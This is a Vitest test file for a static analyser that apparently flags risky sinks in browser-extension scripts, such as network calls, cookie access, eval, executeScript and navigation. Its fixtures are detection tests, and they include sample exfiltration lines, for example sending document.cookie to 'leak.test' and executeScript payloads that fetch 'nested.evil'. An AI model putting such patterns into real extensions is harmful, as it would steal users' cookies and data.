import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { analyzeScript } from "../src/pipeline/layer3-ast/index.ts";

const src = (sample: string, file: string) => readFileSync(`corpus/${sample}/extension/${file}`, "utf8");
const apis = (sinks: { api: string }[]) => sinks.map((s) => s.api);

describe("Layer 3a — sinks", () => {
  it("captures the fetch network sink in mutant A", () => {
    const s = analyzeScript("js/background.js", src("mutant-a-exfil-fetch", "js/background.js"));
    expect(s.parsed_ok).toBe(true);
    expect(s.sinks.some((x) => x.category === "network" && x.api === "fetch")).toBe(true);
  });

  it("captures chrome.cookies.* sinks in ExtRay Demo Cookie Manager's background", () => {
    const s = analyzeScript("js/background.js", src("demo-cookie-manager", "js/background.js"));
    expect(apis(s.sinks).some((a) => a.startsWith("chrome.cookies."))).toBe(true);
    const ck = s.sinks.find((x) => x.api.startsWith("chrome.cookies."))!;
    expect(ck.location.line).toBeGreaterThan(0);
    expect(ck.snippet.length).toBeGreaterThan(0);
  });

  it("captures clipboard + contextMenus side-channel sinks in mutant H (no network sink)", () => {
    const s = analyzeScript("js/background.js", src("mutant-h-curveball-clipboard", "js/background.js"));
    expect(apis(s.sinks)).toContain("navigator.clipboard.writeText");
    expect(apis(s.sinks)).toContain("chrome.contextMenus.create");
    expect(s.sinks.some((x) => x.category === "network")).toBe(false);
  });

  it("sets parsed_ok=false on unparseable source without throwing", () => {
    const s = analyzeScript("js/broken.js", "function ( { return ###");
    expect(s.parsed_ok).toBe(false);
  });
});

// Improvement 007 — browser.* is the WebExtensions/polyfill spelling of chrome.*.
describe("Layer 3a — browser.* namespace normalization (007)", () => {
  it("classifies browser.cookies.getAll like chrome.cookies.getAll", () => {
    const s = analyzeScript("js/x.js", "browser.cookies.getAll({}, () => {})");
    const sink = s.sinks.find((x) => x.category === "cookies");
    expect(sink).toBeDefined();
    expect(sink!.api).toBe("chrome.cookies.getAll");
  });

  it("classifies browser.runtime.sendMessage as messaging and browser.tabs.* as tabs", () => {
    const s = analyzeScript("js/x.js", "browser.runtime.sendMessage({a:1}); browser.tabs.create({url:'x'})");
    expect(s.sinks.some((x) => x.category === "messaging" && x.api === "chrome.runtime.sendMessage")).toBe(true);
    expect(s.sinks.some((x) => x.category === "tabs" && x.api === "chrome.tabs.create")).toBe(true);
  });

  it("resolves the polyfill alias form (const b = chrome; b.cookies.getAll)", () => {
    const s = analyzeScript("js/x.js", "const b = chrome; b.cookies.getAll({}, () => {})");
    expect(s.sinks.some((x) => x.api === "chrome.cookies.getAll")).toBe(true);
  });
});

// Improvement 010 — chrome global obtained from a zero-arg call accessor
// (webextension-polyfill / webpack module getter): x().management.* etc.
describe("Layer 3a — call-accessor chrome globals (010)", () => {
  it("classifies x().management.setEnabled as a privilege sink", () => {
    const s = analyzeScript("js/x.js", "x().management.setEnabled('id', false)");
    expect(s.sinks.some((y) => y.category === "privilege" && y.api === "chrome.management.setEnabled")).toBe(true);
  });

  it("classifies x().scripting.executeScript and x().tabs.query through the accessor", () => {
    const s = analyzeScript("js/x.js", "x().scripting.executeScript({}); x().tabs.query({})");
    expect(s.sinks.some((y) => y.api === "chrome.scripting.executeScript")).toBe(true);
    expect(s.sinks.some((y) => y.category === "tabs" && y.api === "chrome.tabs.query")).toBe(true);
  });

  it("resolves a webRequest listener hung off an aliased accessor result", () => {
    const s = analyzeScript("js/x.js", "const d = x().webRequest; d.onHeadersReceived.addListener(f, {urls:['<all_urls>']})");
    expect(s.sinks.some((y) => y.category === "privilege" && y.api.startsWith("chrome.webRequest."))).toBe(true);
  });

  it("does NOT rewrite a non-chrome-namespace call root (getThing().tabsList)", () => {
    const s = analyzeScript("js/x.js", "getThing().tabsList.query({})");
    expect(s.sinks.some((y) => y.api.startsWith("chrome."))).toBe(false);
  });
});

// Improvement 011 — network sinks carry a structural argument summary so a
// truncated text snippet never hides the request body / auth headers.
describe("Layer 3a — network-sink argument summary (011)", () => {
  it("captures method, header keys, and a dynamic body on a fetch sink", () => {
    const s = analyzeScript(
      "js/x.js",
      'fetch("https://e.test/x",{method:"POST",headers:{apiKey:"k",Authorization:"b"},body:JSON.stringify({email:e})})',
    );
    const f = s.sinks.find((y) => y.api === "fetch" && y.category === "network")!;
    expect(f).toBeDefined();
    const sum = (f.arguments_summary?.[0] ?? {}) as Record<string, unknown>;
    expect(sum.method).toBe("POST");
    expect(sum.header_keys).toEqual(expect.arrayContaining(["apiKey", "Authorization"]));
    expect(sum.body_present).toBe(true);
    expect(sum.body_kind).toBe("dynamic");
  });

  it("does not truncate a network snippet before its body (larger cap)", () => {
    const url = "https://e.test/" + "a".repeat(220);
    const s = analyzeScript("js/x.js", `fetch("${url}", {method:"POST", body: secretValue})`);
    const f = s.sinks.find((y) => y.api === "fetch")!;
    expect(f.snippet).toContain("secretValue");
  });
});

// Improvement 016 — code-exec sinks expose whether the executed string is a
// build-time literal or a dynamic (attacker-influenceable) expression, parity
// with the network-sink argument summary. This is the fact that separates a
// webpack `new Function("return this")` shim from `new Function(userInput)`.
describe("Layer 3a — code-exec argument summary (016)", () => {
  const arg0 = (code: string, api: string) => {
    const sink = analyzeScript("js/x.js", code).sinks.find((s) => s.api === api);
    return (sink?.arguments_summary?.[0] ?? null) as Record<string, unknown> | null;
  };

  it("marks new Function('return this') as a literal and quotes the value", () => {
    expect(arg0("var g = new Function('return this')();", "Function")).toEqual({
      arg0_kind: "literal",
      arg0_value: "return this",
    });
  });

  it("marks new Function(someVariable) as dynamic", () => {
    expect(arg0("var f = new Function(someVariable);", "Function")).toEqual({ arg0_kind: "dynamic" });
  });

  it("uses the LAST Function argument (the body), not a parameter name", () => {
    // "a"/"b" are parameter names (literals); the body is a dynamic expression.
    expect(arg0("new Function('a', 'b', bodyVar);", "Function")).toEqual({ arg0_kind: "dynamic" });
    expect(arg0("new Function('a', 'return a+1');", "Function")).toEqual({
      arg0_kind: "literal",
      arg0_value: "return a+1",
    });
  });

  it("classifies eval literal vs dynamic", () => {
    expect(arg0("eval('1+1')", "eval")).toEqual({ arg0_kind: "literal", arg0_value: "1+1" });
    expect(arg0("eval(userCode)", "eval")).toEqual({ arg0_kind: "dynamic" });
  });

  it("classifies setTimeout/setInterval string payloads", () => {
    expect(arg0('setTimeout("doEvil()", 100)', "setTimeout(string)")).toEqual({
      arg0_kind: "literal",
      arg0_value: "doEvil()",
    });
    expect(arg0("setInterval(payload, 50)", "setInterval(dynamic)")).toEqual({ arg0_kind: "dynamic" });
  });

  it("treats a no-substitution template literal as a literal", () => {
    expect(arg0("eval(`return this`)", "eval")).toEqual({ arg0_kind: "literal", arg0_value: "return this" });
  });

  it("does not attach an argument summary to HTML-writer code-exec sinks", () => {
    const s = analyzeScript("js/x.js", 'document.write("<b>hi</b>")');
    const w = s.sinks.find((x) => x.api === "document.write")!;
    expect(w.category).toBe("code-exec");
    expect(w.arguments_summary).toBeUndefined();
  });
});

// Improvement 007 — document.location.* aliases the global location.
describe("Layer 3a — document.location navigation sink (007)", () => {
  it("flags document.location.href = … as a navigation sink", () => {
    const s = analyzeScript("js/x.js", 'document.location.href = "https://leak.test/?c=" + document.cookie');
    expect(s.sinks.some((x) => x.category === "navigation" && x.api === "location.href =")).toBe(true);
  });

  it("records the folded destination of a document.location.href assignment", () => {
    const s = analyzeScript("js/x.js", 'document.location.href = "https://leak.test/?c=" + token');
    const d = s.network_destinations.find((x) => x.ast_role === "navigation.url");
    expect(d).toBeDefined();
    expect(d!.value).toContain("leak.test");
  });
});

// Improvement 007 — setTimeout/setInterval with a non-function first argument
// (variable / concatenation / template) may evaluate a string: over-flag.
describe("Layer 3a — setTimeout/setInterval dynamic first arg (007)", () => {
  const sinkApis = (code: string) => analyzeScript("js/x.js", code).sinks.map((x) => x.api);

  it("flags a variable first arg as setTimeout(dynamic)", () => {
    expect(sinkApis("setTimeout(payload, 100)")).toContain("setTimeout(dynamic)");
  });

  it("flags concatenation and template first args", () => {
    expect(sinkApis('setInterval("do" + cmd, 50)')).toContain("setInterval(dynamic)");
    expect(sinkApis("setTimeout(`${cmd}()`, 50)")).toContain("setTimeout(dynamic)");
  });

  it("still flags a string literal as setTimeout(string)", () => {
    expect(sinkApis('setTimeout("doEvil()", 100)')).toContain("setTimeout(string)");
  });

  it("does not flag function expressions or known in-file function names", () => {
    const apis = sinkApis("function tick(){}; const beat = () => {}; setTimeout(tick, 1000); setTimeout(beat, 5); setTimeout(() => {}, 1)");
    expect(apis.some((a) => a.startsWith("setTimeout("))).toBe(false);
  });
});

// Improvement 007 — executeScript code payloads are injected source.
describe("Layer 3a — executeScript payloads (007)", () => {
  it("records a string code payload as a code-exec sink AND extracts its nested sinks/destinations", () => {
    const s = analyzeScript("js/x.js", `chrome.tabs.executeScript({code: "fetch('https://nested.evil/x')"})`);
    expect(s.sinks.some((x) => x.category === "code-exec" && x.api === "chrome.tabs.executeScript(code)")).toBe(true);
    expect(s.sinks.some((x) => x.category === "network" && x.api === "fetch")).toBe(true);
    expect(s.network_destinations.some((d) => d.ast_role === "fetch.url" && d.value === "https://nested.evil/x")).toBe(true);
  });

  it("records a dynamic code payload as a code-exec sink (opaque; no nested parse)", () => {
    const s = analyzeScript("js/x.js", "chrome.scripting.executeScript({code: buildPayload()})");
    expect(s.sinks.some((x) => x.api === "chrome.scripting.executeScript(code)")).toBe(true);
    expect(s.sinks.some((x) => x.api === "fetch")).toBe(false);
  });

  it("traverses func: payload bodies in place (already in the same AST)", () => {
    const s = analyzeScript("js/x.js", 'chrome.scripting.executeScript({target: {tabId: 1}, func: () => { fetch("https://nested.evil/f") }})');
    expect(s.sinks.some((x) => x.category === "network" && x.api === "fetch")).toBe(true);
    expect(s.network_destinations.some((d) => d.value === "https://nested.evil/f")).toBe(true);
    // func payloads are not opaque: no (code) sink for them.
    expect(s.sinks.some((x) => x.api.endsWith("(code)"))).toBe(false);
  });
});
